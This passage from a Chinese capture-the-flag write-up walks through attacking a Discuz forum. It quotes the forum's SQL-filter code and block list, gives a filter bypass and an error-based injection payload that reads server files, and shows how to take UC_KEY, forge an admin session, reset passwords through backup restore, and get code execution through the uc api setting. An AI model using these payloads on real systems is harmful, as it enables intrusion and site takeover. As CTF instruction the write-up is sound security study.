                            if (!$mark) {
                                $mark = '\'';
                                $clean .= $str;
                            } elseif ($mark == '\'') {
                                $mark = '';
                            }
                            break;
                        case '/':
                            if (empty($mark) && $sql[$i + 1] == '*') {
                                $mark = '/*';
                                $clean .= $mark;
                                $i++;
                            } elseif ($mark == '/*' && $sql[$i - 1] == '*') {
                                $mark = '';
                                $clean .= '*';
                            }
                            break;
                        case '#':
                            if (empty($mark)) {
                                $mark = $str;
                                $clean .= $str;
                            }
                            break;
                        case "\n":
                            if ($mark == '#' || $mark == '--') {
                                $mark = '';
                            }
                            break;
                        case '-':
                            if (empty($mark) && substr($sql, $i, 3) == '-- ') {
                                $mark = '-- ';
                                $clean .= $mark;
                            }
                            break;
                        default:
                            break;
                    }
                    $clean .= $mark ? '' : $str;
                }
            }
            if(strpos($clean, '@') !== false) {
                return '-3';
            }
            $clean = preg_replace("/[^a-z0-9_\-\(\)#\*\/\"]+/is", "", strtolower($clean));
            if (self::$config['afullnote']) {
                $clean = str_replace('/**/', '', $clean);
            }
            if (is_array(self::$config['dfunction'])) {
                foreach (self::$config['dfunction'] as $fun) {
                    if (strpos($clean, $fun . '(') !== false)
                        return '-1';
                }
            }
            if (is_array(self::$config['daction'])) {
                foreach (self::$config['daction'] as $action) {
                    if (strpos($clean, $action) !== false)
                        return '-3';
                }
            }       
            if (self::$config['dlikehex'] && strpos($clean, 'like0x')) {
                return '-2';
            }
            if (is_array(self::$config['dnote'])) {
                foreach (self::$config['dnote'] as $note) {
                    if (strpos($clean, $note) !== false)
                        return '-4';
                }
            }
然后config中相关的配置为
    $_config['security']['querysafe']['dfunction']['0'] = 'load_file';
    $_config['security']['querysafe']['dfunction']['1'] = 'hex';
    $_config['security']['querysafe']['dfunction']['2'] = 'substring';
    $_config['security']['querysafe']['dfunction']['3'] = 'if';
    $_config['security']['querysafe']['dfunction']['4'] = 'ord';
    $_config['security']['querysafe']['dfunction']['5'] = 'char';
    $_config['security']['querysafe']['daction']['0'] = '@';
    $_config['security']['querysafe']['daction']['1'] = 'intooutfile';
    $_config['security']['querysafe']['daction']['2'] = 'intodumpfile';
    $_config['security']['querysafe']['daction']['3'] = 'unionselect';
    $_config['security']['querysafe']['daction']['4'] = '(select';
    $_config['security']['querysafe']['daction']['5'] = 'unionall';
    $_config['security']['querysafe']['daction']['6'] = 'uniondistinct';
    $_config['security']['querysafe']['dnote']['0'] = '/*';
    $_config['security']['querysafe']['dnote']['1'] = '*/';
    $_config['security']['querysafe']['dnote']['2'] = '#';
    $_config['security']['querysafe']['dnote']['3'] = '--';
    $_config['security']['querysafe']['dnote']['4'] = '"';
这道题目特殊的地方在于，他开启了`afullnote`
        if (self::$config['afullnote']) {
            $clean = str_replace('/**/', '', $clean);
        }
由于`/**/`被替换为空，所以我们可以直接用前面的逻辑把select加入到这中间，之后被替换为空，就可以绕过这里的判断。
当我们得到一个报错注入之后，我们尝试读取文件内容，发现由于mysql是`5.5.29`，所以我们可以直接读取服务器上的任意文件。
    $code = 'time='.time().'&action=renameuser&uid=1&newusername=ddog\',name=(\'a\' or updatexml(1,concat(0x7e,(/*!00000select*/ /*!00000load_file*/(\'c:/windows/win.ini\') limit 1)),0)),title=\'a';
思路走到这里出现了断层，因为我们没办法知道web路径在哪里，所以我们没办法直接读到web文件，这里我僵持了很久，最后还是因为第一个人做出题目后密码是弱密码，我直接查出来进了后台。
在事后回溯的过程中，发现还是有办法的，虽然说对于windows来说，web的路径很灵活，但是实际上对于集成环境来说，一般都安装在c盘下，而且一般人也不会去动服务端的路径。常见的windows集成环境主要有phpstudy和wamp，这两个路径分别为
    - /wamp64/www/
    - /phpstudy_pro/WWW/
找到相应的路径之后，我们可以读取`\uc_server\data\config.inc.php`得到uc server的`UC_KEY`.
之后我们可以直接调用`/uc_server/api/dpbak.php`中定义的
        function sid_encode($username) {
            $ip = $this->onlineip;
            $agent = $_SERVER['HTTP_USER_AGENT'];
            $authkey = md5($ip.$agent.UC_KEY);
            $check = substr(md5($ip.$agent), 0, 8);
            return rawurlencode($this->authcode("$username\t$check", 'ENCODE', $authkey, 1800));
        }
        function sid_decode($sid) {
            $ip = $this->onlineip;
            $agent = $_SERVER['HTTP_USER_AGENT'];
            $authkey = md5($ip.$agent.UC_KEY);
            $s = $this->authcode(rawurldecode($sid), 'DECODE', $authkey, 1800);
            if(empty($s)) {
                return FALSE;
            }
            @list($username, $check) = explode("\t", $s);
            if($check == substr(md5($ip.$agent), 0, 8)) {
                return $username;
            } else {
                return FALSE;
            }
        }
构造管理员的sid来绕过权限验证，通过这种方式我们可以修改密码并登录后台。
## 2、使用数据库备份还原修改密码
事实上，当上一种攻击方式跟到uc
server的`UC_KEY`时，就不难发现，在`/uc_server/api/dbbak.php`中有许多关于数据库备份与恢复的操作，这也是我之前没发现的点。
事实上，在`/api/dbbak.php`就有一模一样的代码和功能，而那个api只需要DZ的`UC_KEY`就可以操作，我们可以在前台找一个地方上传，然后调用备份恢复覆盖数据库文件，这样就可以修改管理员的密码。
# 后台getshell
登录了之后就比较简单了，首先
![
](https://images.seebug.org/content/images/2020/05/815358e5-e926-4bdf-94c6-a953bd8bd779.png-w331s)
修改uc api 为
    http://127.0.0.1/uc_server');phpinfo();//
然后使用预先准备poc更新uc api
![
](https://images.seebug.org/content/images/2020/05/17d06789-0552-4101-96a3-29572e57f10d.png-w331s)
这里返回11就可以了
# 写在最后
整道题目主要围绕的DZ的核心密钥安全体系，实际上除了在windows环境下，几乎没有其他的特异条件，再加上短文件名问题原因主要在服务端，我们很容易找到备份文件，在找到备份文件之后，我们可以直接从数据库获得最重要的authkey和uc
key，接下来的渗透过程就顺理成章了。
从这篇文章中，你也可以窥得在不同情况下利用方式得拓展，配合原文阅读可以获得更多的思路。
# REF
  * 
  * 
  * 
* * *